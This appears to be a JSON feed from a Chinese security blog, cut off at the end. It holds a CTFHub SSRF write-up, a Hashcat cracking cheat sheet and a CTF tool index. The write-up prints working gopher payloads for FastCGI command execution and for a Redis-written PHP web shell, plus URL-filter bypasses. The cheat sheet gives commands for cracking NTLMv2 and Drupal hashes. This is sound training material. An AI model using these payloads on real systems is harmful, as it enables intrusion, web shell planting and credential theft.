{
  "version": "https://jsonfeed.org/version/1.1",
  "title": "sub esp,∞",
  "home_page_url": "http://www.liuhanzhe.com/",
  "feed_url": "http://www.liuhanzhe.com/feed.json",
  "author": {
    "name": "lhz"
  },
  "items": [
    {
      "title": "CTF",
      "url": "http://www.liuhanzhe.com/docs/security/ctf/other/0.readme/",
      "id": "http://www.liuhanzhe.com/docs/security/ctf/other/0.readme/",
      "content_html": "<ul>\n<li></li>\n</ul>\n",
      "date_published": "2022-04-20T06:36:02.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "writeup",
      "url": "http://www.liuhanzhe.com/docs/security/ctf/writeup/0.readme/",
      "id": "http://www.liuhanzhe.com/docs/security/ctf/writeup/0.readme/",
      "content_html": "<ul>\n<li><a href=\"./ctfhub_ssrf.html\">ctfhub_ssrf</a></li>\n</ul>\n",
      "date_published": "2022-04-20T06:36:02.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": []
    },
    {
      "title": "CTFHub-SSRF-Writeup",
      "url": "http://www.liuhanzhe.com/docs/security/ctf/writeup/ctfhub_ssrf/",
      "id": "http://www.liuhanzhe.com/docs/security/ctf/writeup/ctfhub_ssrf/",
      "content_html": "<h2 id=\"ssrf\"> SSRF</h2>\n<p><img src=\"/assets/img/ctf/ssrf.png\" alt=\"ssrf\" /></p>\n<h3 id=\"内网访问\"> 内网访问</h3>\n<p>直接构造访问请求,获取flag</p>\n<div><pre><code>/?url=127.0.0.1/flag.php\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"伪协议读取文件\"> 伪协议读取文件</h3>\n<p>根据题目提示使用file://协议，尝试一般web目录/var/www/html/<br>\n<img src=\"/assets/img/ctf/file.png\" alt=\"file\" /></p>\n<h3 id=\"端口扫描\"> 端口扫描</h3>\n<p>提示端口范围8000到9000</p>\n<div><pre><code><span><span>/</span></span><span><span>?</span><span><span>url</span>=<span>127.0.0.1:8000</span></span></span>\n</code></pre>\n<div><span>1</span><br></div></div><p>使用burpsuite对端口进行爆破，即可得到端口，访问获取flag</p>\n<h3 id=\"post请求\"> POST请求</h3>\n<p>访问/?url=127.0.0.1/flag.ph,返回页面<br>\n<img src=\"/assets/img/ctf/post1.png\" alt=\"post1\" /><br>\n包含一个form和隐藏的key，推测需要在form中提交key，F12添加提交按钮</p>\n<div><pre><code>&lt;input type=&quot;submit&quot; name=&quot;sbumit&quot;&gt;\n</code></pre>\n<div><span>1</span><br></div></div><p><img src=\"/assets/img/ctf/post3.png\" alt=\"post3\" /><br>\n在页面上提交key，页面返回&quot;Just View From 127.0.0.1&quot;<br>\n<img src=\"/assets/img/ctf/post5.png\" alt=\"post5\" /><br>\n可见需要通过SSRF提交请求，构造POST请求</p>\n<div><pre><code>  POST /flag.php HTTP/1.1\n  Host: 127.0.0.1:80\n  Content-Type: application/x-www-form-urlencoded\n  Content-Length: 36\n\n  key=99cb8729f8a7ba5dcaa367dc092c2f2c\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><p>因为通过SSRF，需要进行两次请求，所以对请求数据进行2次url编码，注意使用CRLF，第一次url编码后需要将%0A替换为%0D%0A,最后得到请求数据</p>\n<div><pre><code>  POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252036%250D%250A%250D%250Akey%253D99cb8729f8a7ba5dcaa367dc092c2f2c\n</code></pre>\n<div><span>1</span><br></div></div><p>使用gopher发送请求，gopher协议是SSRF中常用的一个协议：</p>\n<div><pre><code><span>gopher<span>:</span></span><span><span>//</span><span>IP</span><span><span>:</span></span></span><span>port<span>/</span>_</span>{TCP/IP数据流}\n</code></pre>\n<div><span>1</span><br></div></div><p>​    得到flag<br>\n​    <img src=\"/assets/img/ctf/post4.png\" alt=\"post4\" /></p>\n<h3 id=\"文件上传\"> 文件上传</h3>\n<p>使用file协议查看flag.php，代码检查了上传ip和文件大小，所以需要从127.0.0.1上传非空文件</p>\n<div><pre><code><span><span>&lt;?php</span>\n<span>error_reporting</span><span>(</span><span>0</span><span>)</span><span>;</span>\n<span>if</span><span>(</span><span>$_SERVER</span><span>[</span><span>\"REMOTE_ADDR\"</span><span>]</span> <span>!=</span> <span>\"127.0.0.1\"</span><span>)</span><span>{</span>\n    <span>echo</span> <span>\"Just View From 127.0.0.1\"</span><span>;</span>\n    <span>return</span><span>;</span>\n<span>}</span>\n<span>if</span><span>(</span><span>isset</span><span>(</span><span>$_FILES</span><span>[</span><span>\"file\"</span><span>]</span><span>)</span> <span>&amp;&amp;</span> <span>$_FILES</span><span>[</span><span>\"file\"</span><span>]</span><span>[</span><span>\"size\"</span><span>]</span> <span>></span> <span>0</span><span>)</span><span>{</span>\n    <span>echo</span> <span>getenv</span><span>(</span><span>\"CTFHUB\"</span><span>)</span><span>;</span>\n    <span>exit</span><span>;</span>\n<span>}</span>\n<span>?></span></span>\nUpload Webshell\n<span><span><span>&lt;</span>form</span> <span>action</span><span><span>=</span><span>\"</span>/flag.php<span>\"</span></span> <span>method</span><span><span>=</span><span>\"</span>post<span>\"</span></span> <span>enctype</span><span><span>=</span><span>\"</span>multipart/form-data<span>\"</span></span><span>></span></span>\n    <span><span><span>&lt;</span>input</span> <span>type</span><span><span>=</span><span>\"</span>file<span>\"</span></span> <span>name</span><span><span>=</span><span>\"</span>file<span>\"</span></span><span>></span></span>\n<span><span><span>&lt;/</span>form</span><span>></span></span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><p>访问<code>/?url=127.0.0.1/flag.php</code>，返回一个文件上传form，根据题意需要提交文件获取flag，F12添加提交按钮<br>\n<img src=\"/assets/img/ctf/upload1.png\" alt=\"upload1\" /><br>\n提交一个随意非空文件，抓取上传数据包，修改host为127.0.0.1:80<br>\n<img src=\"/assets/img/ctf/upload2.png\" alt=\"upload2\" /><br>\n对上传数据进行二次url编码，注意第一次编码后将%0A替换为%0D%0A，得到编码后的请求数据</p>\n<div><pre><code>POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520280%250D%250ACache-Control%253A%2520max-age%253D0%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F92.0.4515.159%2520Safari%252F537.36%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Favif%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-426ad735267eb08d.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250D%250ACookie%253A%2520UM_distinctid%253D17b2f471020f2e-06f3628e7e7e6e-4343363-1fa400-17b2f47102110f5%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%2522123.txt%2522%250D%250AContent-Type%253A%2520text%252Fplain%250D%250A%250D%250A123%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522123%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryM9A8PenlAkNIPrWa--\n</code></pre>\n<div><span>1</span><br></div></div><p>使用gopher发送请求，得到flag<br>\n<img src=\"/assets/img/ctf/upload3.png\" alt=\"upload3\" /></p>\n<h3 id=\"fastcgi协议\"> FastCGI协议</h3>\n<p><a href=\"https://blog.csdn.net/mysteryflower/article/details/94386461\" target=\"_blank\" rel=\"noopener noreferrer\">fastcgi相关介绍</a><br>\n<a href=\"https://github.com/tarunkant/Gopherus\" target=\"_blank\" rel=\"noopener noreferrer\">gopher payload工具</a><br>\n使用gopherus工具生成payload，运行命令<code>ls /</code><br>\n<img src=\"/assets/img/ctf/fastcgi1.png\" alt=\"fastcgi1\" /><br>\n进行url编码后得到提交payload</p>\n<div><pre><code><span>gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2504%2500%253C%253Fphp%2520system%2528%2527ls%2520%2F%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span>\n</code></pre>\n<div><span>1</span><br></div></div><p>发送请求，获取<code>/</code>下目录情况,发现flag文件<br>\n<img src=\"/assets/img/ctf/fastcgi2.png\" alt=\"fastcgi2\" /><br>\n使用gopherus工具生成payload，运行命令<code>cat /flag_14e0ba551d369f7992793e0b62395dc5</code><br>\n<img src=\"/assets/img/ctf/fastcgi3.png\" alt=\"fastcgi3\" /><br>\n进行url编码后得到提交payload</p>\n<div><pre><code><span>gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_14e0ba551d369f7992793e0b62395dc5%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</span>\n</code></pre>\n<div><span>1</span><br></div></div><p>发送请求，获得flag<br>\n<img src=\"/assets/img/ctf/fastcgi4.png\" alt=\"fastcgi4\" /></p>\n<h3 id=\"redis协议\"> Redis协议</h3>\n<p><a href=\"https://xz.aliyun.com/t/5665\" target=\"_blank\" rel=\"noopener noreferrer\">浅析Redis中SSRF的利用</a><br>\nredis写shell命令如下</p>\n<div><pre><code>flushall\n<span>set</span> <span>1</span> <span>'&lt;?php eval($_GET[\"feng\"]);?>'</span>\nconfig <span>set</span> <span>dir</span> /var/www/html\nconfig <span>set</span> dbfilename feng.php\nsave\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><p>使用gopherus工具生成redis攻击payload<br>\n<img src=\"/assets/img/ctf/redis1.png\" alt=\"redis1\" /><br>\n进行url编码得到请求payload</p>\n<div><pre><code>gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A\n</code></pre>\n<div><span>1</span><br></div></div><p>请求后生成一句话shell.php文件，利用参数cmd，构造请求<code>/shell.php?cmd=ls%20/</code><br>\n<img src=\"/assets/img/ctf/redis2.png\" alt=\"redis2\" /><br>\n获取flag文件，再构造请求<code>/shell.php?cmd=cat%20/flag_1d41ab57dcc1507d5d99e103cdca52da</code>,获得flag<br>\n<img src=\"/assets/img/ctf/redis3.png\" alt=\"redis3\" /></p>\n<h3 id=\"url-bypasss\"> URL Bypasss</h3>\n<p>访问地址提示&quot;start with <code>http://notfound.ctfhub.com</code>&quot;, 所以需要以<code>http://notfound.ctfhub.com</code>开头，构造访问url如下获取flag</p>\n<div><pre><code><span><span>/</span></span><span><span>?</span><span><span>url</span>=<span>http://notfound.ctfhub.com@127.0.0.1/flag.php</span></span></span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"数字ip-bypass\"> 数字IP Bypass</h3>\n<p>题目提示ban掉了127以及172.不能使用点分十进制的IP，但是又要访问127.0.0.1</p>\n<ul>\n<li>方法一：<br>\n使用localhost代替127.0.0.1,构造请求url如下，获取flag</li>\n</ul>\n<div><pre><code><span><span>/</span></span><span><span>?</span><span><span>url</span>=<span>http://localhost/flag.php</span></span></span>\n</code></pre>\n<div><span>1</span><br></div></div><ul>\n<li>方法二:<br>\n将127.0.0.1转换为16进制0x7F000001,构造请求url如下，获取flag</li>\n</ul>\n<div><pre><code><span><span>/</span></span><span><span>?</span><span><span>url</span>=<span>http://0x7F000001/flag.php</span></span></span>\n</code></pre>\n<div><span>1</span><br></div></div><h3 id=\"_302跳转-bypass\"> 302跳转 Bypass</h3>\n<p>题目提示过滤了127.0.0.1，使用可以绕过，但是题意是使用302跳转绕过，可以生成短链接302跳转获得flag,  <a href=\"https://my5353.com/\" target=\"_blank\" rel=\"noopener noreferrer\">短链接生成网站</a><br>\n<img src=\"/assets/img/ctf/302.png\" alt=\"短链接访问\" /></p>\n<h3 id=\"dns重绑定\"> DNS重绑定</h3>\n<p><a href=\"https://zhuanlan.zhihu.com/p/89426041\" target=\"_blank\" rel=\"noopener noreferrer\">DNS重绑定漏洞</a><br>\n使用file://协议查看flag.php查看代码发现过滤了<code>/127|172|10|192/</code>开头，可以用16进制方式绕过，但是考虑到题目要求使用DNS重绑定<br>\n使用<a href=\"https://lock.cmpxchg8b.com/rebinder.html\" target=\"_blank\" rel=\"noopener noreferrer\">rbndr.us dns rebinding service</a>获取域名<br>\n<img src=\"/assets/img/ctf/dns1.png\" alt=\"dns1\" /><br>\n访问或取flag<br>\n<img src=\"/assets/img/ctf/dns2.png\" alt=\"dns2\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/ctf/ssrf.png",
      "date_published": "2021-08-24T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "CTF"
      ]
    },
    {
      "title": "密码破解工具 Hashcat",
      "url": "http://www.liuhanzhe.com/docs/security/tools/10.hashcat/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/10.hashcat/",
      "content_html": "<p>Hashcat号称是世界上最快的密码破解软件，可调用GPU进行密码破解，早在Hashcat 4.x版本就宣称可破解256个字符长度的密码，而且支持上百种算法，基本市面上所有的算法都支持。</p>\n<div><pre><code>-m                           \t指定哈希类型\n-a                            \t指定破解模式\n-V                            \t查看版本信息\n-o                            \t将输出结果储存到指定文件\n--force                     \t忽略警告\n--show                    \t\t仅显示破解的hash密码和对应的明文\n--remove                 \t\t从源文件中删除破解成功的hash\n--username             \t\t\t忽略hash表中的用户名\n-b                             \t测试计算机破解速度和相关硬件信息\n-O                            \t限制密码长度\n-T                            \t设置线程数\n-r                             \t使用规则文件\n-1                             \t自定义字符集  -1 0123asd     ?1={0123asd}\n-2                             \t自定义字符集  -2 0123asd    ?2={0123asd}\n-3                             \t自定义字符集  -3 0123asd    ?3={0123asd}\n-i                              启用增量破解模式\n--increment-min       \t\t\t设置密码最小长度\n--increment-max      \t\t\t设置密码最大长度\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br></div></div><p>hashcat破解模式介绍</p>\n<div><pre><code>0    straight                                字典破解\n1    combination                             将字典中密码进行组合（1 2&gt;11 22 12 21）\n3    brute-force                             使用指定掩码破解\n6    Hybrid Wordlist + Mask                  字典+掩码破解\n7    Hybrid Mask  + Wordlist                 掩码+字典破解\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><p>举例\n使用Hashcat破解NTLMv2:</p>\n<div><pre><code>\thashcat -m 5600 Net-NTLM-Hash  password.txt\n</code></pre>\n<div><span>1</span><br></div></div><p>爆破Drupal密码(密码hash保存在hash.txt中)：</p>\n<div><pre><code>\thashcat -m 7900 -a 0 hash.txt password_dict.txt\n</code></pre>\n<div><span>1</span><br></div></div>",
      "date_published": "2018-10-01T00:00:00.000Z",
      "date_modified": "2022-04-20T06:36:02.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "安全工具"
      ]
    },
    {
      "title": "工具索引",
      "url": "http://www.liuhanzhe.com/docs/security/tools/0.%E7%B4%A2%E5%BC%95/",
      "id": "http://www.liuhanzhe.com/docs/security/tools/0.%E7%B4%A2%E5%BC%95/",
      "content_html": "<h2 id=\"_0x01-ctf相关工具\"> 0x01 CTF相关工具</h2>\n<h3 id=\"_1-压缩包工具\"> 1.压缩包工具</h3>\n<ul>\n<li><a href=\"\">RarCrack</a> - linux下用于暴力破解压缩文件的密码，但仅支持RAR, ZIP, 7Z这三种类型的压缩</li>\n<li><a href=\"\">ARCHPR</a> - windows下压缩包神器，支持暴力破解，明文攻击等方式\n<ul>\n<li>Path:工具/1.CTF/压缩包/ARCHPR_downcc.zip</li>\n</ul>\n</li>\n<li><a href=\"\">fcrackzip</a> - 一款专门破解zip类型压缩文件密码的工具，工具小巧方便、破解速度快，能使用字典和指定字符集破解，适用于linux、mac osx系统。</li>\n<li><a href=\"\">PKCrack</a> - linux下zip明文攻击工具，明文攻击更推荐使用<code>ARCHPR</code>\n<ul>\n<li>\n<p>下载链接：https://www.unix-ag.uni-kl.de/~conrad/krypto/pkcrack.html</p>\n</li>\n<li>\n<p>使用: <code>./pkcrack -c &quot;readme.txt&quot; -p readme.txt -C ~/下载/misc/Desktop.zip -P ~/下载/misc/readme.zip -d ~/decrypt.zip</code></p>\n</li>\n</ul>\n</li>\n<li><a href=\"\">RAR Password Unlocker</a> - 一款windows快速的爆破RAR压缩文件密码的工具，其支持暴力破解，掩码破解以及字典破解等方式。\n<ul>\n<li>Path:工具/1.CTF/压缩包/RAR Password Unlocker</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"_2-隐写工具\"> 2.隐写工具</h3>\n<ul>\n<li>\n<p><a href=\"http://www.petitcolas.net/steganography/mp3stego/\" target=\"_blank\" rel=\"noopener noreferrer\">Mp3Stego</a> - 一款mp3隐写和查看工具</p>\n<ul>\n<li>Path: 工具/1.CTF/隐写/mp3stego</li>\n<li>使用:<code>encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3</code>\n<code>decode -X -P pass svega_stego.mp3</code></li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://github.com/AngelKitty/stegosaurus\" target=\"_blank\" rel=\"noopener noreferrer\">Stegosaurus</a> - 一款隐写工具，它允许我们在 Python 字节码文件( pyc 或 pyo )中嵌入任意 Payload 。由于编码密度较低，因此我们嵌入 Payload 的过程既不会改变源代码的运行行为，也不会改变源文件的文件大小。 Payload 代码会被分散嵌入到字节码之中，所以类似 strings 这样的代码工具无法查找到实际的 Payload 。 Python 的 dis 模块会返回源文件的字节码，然后我们就可以使用 Stegosaurus 来嵌入 Payload 了。</p>\n<ul>\n<li>\n<blockquote>\n<p>Tips: Stegosaurus 仅支持 Python3.6 及其以下版本</p>\n</blockquote>\n</li>\n<li>\n<p>Path: 工具/1.CTF/隐写/stegosaurus-master</p>\n</li>\n<li>\n<p>使用: <code>python3 stegosaurus.py -x QAQ.pyc</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"\">foremost</a> - foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具</p>\n<ul>\n<li>安装: <code>apt-get install foremost</code></li>\n<li>使用: <code>foremost carter.jpg</code></li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://github.com/Paradoxis/StegCracker\" target=\"_blank\" rel=\"noopener noreferrer\">StegCracker</a> - 隐写术蛮力破解程序，用于发现文件中的隐藏数据。</p>\n<ul>\n<li>Path: 工具/1.CTF/隐写/StegCracker-master.zip</li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://github.com/RickdeJager/stegseek\" target=\"_blank\" rel=\"noopener noreferrer\">stegseek</a> - Stegseek 是一个闪电般快速的 steghide 破解器，可用于从文件中提取隐藏数据。</p>\n<ul>\n<li>\n<p>Path: 工具/1.CTF/隐写/stegseek-master.zip</p>\n<p>​\t工具/1.CTF/隐写/stegseek-master.zipstegseek_0.6-1.deb</p>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"\">robot36</a> - 音频转图像</p>\n<ul>\n<li>Path: 工具/1.CTF/隐写/robot36-master.zip</li>\n<li>install：make</li>\n<li>usage: ./decode</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"_3-流量分析工具\"> 3.流量分析工具</h3>\n<ul>\n<li>\n<p><a href=\"https://f00l.de/hacking/pcapfix.php\" target=\"_blank\" rel=\"noopener noreferrer\">PcapFix Online</a> - 在线数据包修复</p>\n<ul>\n<li>https://f00l.de/hacking/pcapfix.php</li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://github.com/Rup0rt/pcapfix/tree/devel\" target=\"_blank\" rel=\"noopener noreferrer\">PcapFix</a> - 本地数据包分析</p>\n<ul>\n<li>\n<p>Path: 工具/1.CTF/流量包/pcapfix-1.1.7</p>\n</li>\n<li>\n<p>Usage:</p>\n<div><pre><code>./pcapfix <span>[</span>OPTIONS<span>]</span> filename\nOPTIONS:  -d        , --deep-scan \t  \tDeep Scan <span>(</span>default <span>=</span> <span>0</span><span>)</span> <span>(</span>pcap only<span>!</span><span>)</span>\n\t\t  -s        , --soft-mode\t\t\tSoft mode <span>(</span>packet detection<span>)</span>\n          -n        , --pcapng \t  \t\tForce File Format to PCAPNG\n\t\t  -o <span>&lt;</span>file<span>></span> , --outfile <span>&lt;</span>file<span>></span>\t\tSet output <span>file</span> name\n          -t <span>&lt;</span>nr<span>></span>\t  , --data-link-type <span>&lt;</span>nr<span>></span>\tData Link Type <span>(</span>default <span>=</span> <span>1</span><span>)</span>\n          -v        , --verbose \t  \t\tVerbose output <span>(</span>default <span>=</span> <span>0</span><span>)</span>\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div></li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://github.com/WangYihang/UsbMiceDataHacker\" target=\"_blank\" rel=\"noopener noreferrer\">UsbMiceDataHacker</a> - 从usb通信包中提取鼠标移动数据的取证工具，可以画成一张图片</p>\n<ul>\n<li>\n<p>path: 工具/1.CTF/流量包/UsbMiceDataHacker</p>\n</li>\n<li>\n<p>Usage: <code>python UsbMiceHacker.py data.pcap out.png [LEFT|RIGHT|MOVE|ALL]</code></p>\n</li>\n<li>\n<blockquote>\n<p>Tips: To use this python script , you must install the numpy,matplotlib,Wireshark first.\nYou can use <code>sudo pip install matplotlib numpy</code> to install it.</p>\n</blockquote>\n</li>\n</ul>\n</li>\n<li>\n<p><a href=\"\">NetworkMiner</a> - 一个 Windows 下的网络数据分析工具，可以通过包检查或者PCAP 文件来探测包括操作系统、主机名和打开的端口，提取流量中的文件</p>\n<ul>\n<li>Path: 工具/1.CTF/流量包/NetworkMiner</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"_4-编码工具\"> 4.编码工具</h3>\n<ul>\n<li>\n<p><a href=\"\">离线编码工具</a> - windows离线编码、解码工具</p>\n<ul>\n<li>Path: 工具/1.CTF/编码/[随波逐流]CTF编码工具 V1.0.20201116.exe</li>\n</ul>\n</li>\n<li>\n<p><a href=\"http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx\" target=\"_blank\" rel=\"noopener noreferrer\">摩尔斯编码在线转换</a></p>\n<ul>\n<li>http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://www.calormen.com/jslogo/\" target=\"_blank\" rel=\"noopener noreferrer\">logo解释器</a> - logo编程语言在线解释器</p>\n<ul>\n<li>https://www.calormen.com/jslogo/</li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://github.com/hellman/xortool\" target=\"_blank\" rel=\"noopener noreferrer\">xortool</a> - xortool是一个多字节异或加密破解工具。</p>\n<ul>\n<li>\n<p>path: 工具/1.CTF/编码/xortool-master.zip</p>\n</li>\n<li>\n<p>install: pip3 install xortool</p>\n</li>\n<li>\n<p>usage:  <code>$ xortool binary_xored</code></p>\n<p>​\t\t<code>$ xortool binary_xored -l 10 -c 00</code></p>\n<p>​\t\t<code>$ xortool text_xored -l 10 -c 20</code></p>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"_5-图片相关\"> 5.图片相关</h3>\n<ul>\n<li>\n<p><a href=\"./../CTF/WriteUp/2020-BJDCTF-Misc-一叶障目.html\">png图片CRC修复</a></p>\n<ul>\n<li>Path: <a href=\"./../CTF/WriteUp/2020-BJDCTF-Misc-一叶障目.html\">2020-BJDCTF-Misc-一叶障目.md</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"\">png图片高度和宽度修复</a></p>\n<ul>\n<li>Path: <a href=\"./../CTF/Misc/4.图片分析.html##\">4.图片分析.md</a> 例题中代码</li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://github.com/redNixon/stegdetect\" target=\"_blank\" rel=\"noopener noreferrer\">Stegdetect</a> - 通过统计分析技术评估 JPEG 文件的 DCT 频率系数的隐写工具, 可以检测到通过 JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX 和 Camouflage 等这些隐写工具隐藏的信息</p>\n<ul>\n<li>Path：工具/1.CTF/图片/stegdetect-master.zip</li>\n<li>$ linux32 ./configure\n$ linux32 make</li>\n<li>usage:  ./stegdetect -tF $img</li>\n</ul>\n</li>\n<li>\n<p><a href=\"https://domnit.org/stepic/doc/\" target=\"_blank\" rel=\"noopener noreferrer\">stepic</a> - 一个基于 Stepic 的图形隐写工具。除了普通的隐写术之外，它还支持AES加密,图片只能使用BMP或者PNG格式的图片</p>\n<ul>\n<li>使用: <a href=\"./2.图片隐写工具-stepic.html\">2.图片隐写工具-stepic</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"./3.图片隐写查看工具-Stegsolve.html\">Stegsolve</a> - 一款常用的图片隐写查看工具，可以对图片查看LSB/MSB等，可以对gif逐帧查看，也可以比较两个图片的不同，是图片隐写类题目居家旅行必备工具</p>\n</li>\n<li>\n<p>Path: 工具/1.CTF/图片/Stegsolve.jar</p>\n</li>\n<li>\n<p>使用: <a href=\"./3.图片隐写查看工具-Stegsolve.html\">3.图片隐写查看工具-Stegsolve</a></p>\n</li>\n<li>\n<p><a href=\"http://linux01.gwdg.de/~alatham/stego.html\" target=\"_blank\" rel=\"noopener noreferrer\">JPHS</a> - JPEG 图像的信息隐藏软件 JPHS，它是由 Allan Latham 开发设计实现在 Windows 和 Linux 系统平台针对有损压缩 JPEG 文件进行信息加密隐藏和探测提取的工具。软件里面主要包含了两个程序 JPHIDE 和 JPSEEK。JPHIDE 程序主要是实现将信息文件加密隐藏到 JPEG 图像功能，而 JPSEEK 程序主要实现从用 JPHIDE 程序加密隐藏得到的 JPEG 图像探测提取信息文件，Windows 版本的 JPHS 里的 JPHSWIN 程序具有图形化操作界面且具备 JPHIDE 和 JPSEEK 的功能。</p>\n<ul>\n<li>Path: 工具/1.CTF/隐写/jphs05</li>\n</ul>\n</li>\n<li>\n<p><a 